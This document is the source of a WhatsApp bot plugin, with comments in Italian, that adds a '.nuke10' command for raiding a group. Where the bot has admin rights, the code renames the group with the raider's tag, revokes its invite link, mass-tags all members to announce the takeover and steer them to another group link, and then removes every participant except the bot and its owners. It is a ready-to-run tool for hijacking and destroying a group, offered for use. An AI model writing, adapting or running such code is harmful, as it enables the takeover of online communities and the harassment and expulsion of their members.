/*
  =============================================================
  PLUGIN: nuke10.js (Versione Testuale per Linux)
  UTILIZZO: .nuke10 <link_gruppo o ID_gruppo>
  =============================================================
*/

const delay = time => new Promise(res => setTimeout(res, time));

let handler = async (m, { conn, args, usedPrefix, isOwner }) => {
    
    if (!isOwner) return; 

    let input = args[0];
    if (!input) return m.reply(`Indica il link o l'ID del gruppo.\nEsempio: *${usedPrefix}nuke10 https://chat.whatsapp.com/xxxx*`);

    let groupJid = '';

    // 1. Estrazione ID dal link o testo
    if (input.includes('chat.whatsapp.com/')) {
        let code = input.split('chat.whatsapp.com/')[1].split(' ')[0];
        try {
            let info = await conn.groupGetInviteInfo(code);
            groupJid = info.id;
        } catch (e) {
            return m.reply("❌ Link non valido o bot non autorizzato a leggere il link.");
        }
    } else {
        groupJid = input.endsWith('@g.us') ? input : input + '@g.us';
    }

    // 2. Controllo poteri Admin nel gruppo target
    let metadata;
    try {
        metadata = await conn.groupMetadata(groupJid);
    } catch (e) {
        return m.reply("❌ Errore: Il bot non è presente nel gruppo o l'ID è errato.");
    }

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
    const isBotAdmin = metadata.participants.find(p => p.id === botId)?.admin;

    if (!isBotAdmin) {
        return m.reply("❌ **AZIONE FALLITA**: Il bot NON è amministratore nel gruppo target.");
    }

    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    const participants = metadata.participants;

    // --- LOGICA ORIGINALE SACROON ---
    
    // A. Nome Gruppo
    try {
        await conn.groupUpdateSubject(groupJid, `${metadata.subject} | 𝑺𝑽𝑻 𝑩𝒀  𝐒𝚫𝐂𝐑𝚯𝚯𝚴`);
    } catch {}

    // B. Reset Link
    try {
        await conn.groupRevokeInvite(groupJid);
    } catch {}

    // C. Annuncio e Tag
    const allJids = participants.map(p => p.id);
    await conn.sendMessage(groupJid, { text: "𝐒𝚫𝐂𝐑𝚯𝚯𝚴 𝑹𝑬𝑮𝑵𝑨 𝑨𝑵𝑪𝑯𝑬 𝑺𝑼 𝑸𝑼𝑬𝑺𝑻𝑶 𝑮𝑹𝑼𝑷𝑷𝑶" });
    await conn.sendMessage(groupJid, {
        text: `𝑶𝑹𝑨 𝑬𝑵𝑻𝑹𝑨𝑻𝑬 𝑻𝑼𝑻𝑻𝑰 𝑸𝑼𝑰:\n\nhttps://chat.whatsapp.com/BjaVA7mrVhlKMczaJSPL5s?mode=gi_t`,
        mentions: allJids
    });

    await delay(1000); 

    // D. Wipe Utenti
    let usersToRemove = participants
        .map(p => p.id)
        .filter(jid => jid !== botId && !ownerJids.includes(jid));

    if (usersToRemove.length > 0) {
        try {
            await conn.groupParticipantsUpdate(groupJid, usersToRemove, 'remove');
            await m.reply(`✅ Nuke completato su ${metadata.subject}.`);
        } catch (e) {
            await m.reply("❌ Errore durante la rimozione (limite WhatsApp o permessi).");
        }
    } else {
        await m.reply("⚠ Nessun utente da rimuovere.");
    }
};

handler.command = ['nuke10'];
handler.owner = true;

export default handler;
